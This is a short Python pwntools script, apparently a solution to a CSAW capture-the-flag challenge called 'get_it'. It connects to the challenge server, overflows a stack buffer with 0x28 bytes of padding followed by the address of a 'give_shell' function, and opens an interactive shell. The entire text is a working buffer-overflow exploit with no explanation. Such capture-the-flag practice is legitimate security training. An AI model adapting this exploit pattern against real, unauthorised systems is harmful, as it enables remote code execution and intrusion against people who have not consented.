from pwn import *

#r = process('./get_it')
r = remote('pwn.chal.csaw.io', 9001)
e = ELF('./get_it')
r.send('A'*0x28+p64(e.symbols['give_shell']))

r.interactive()
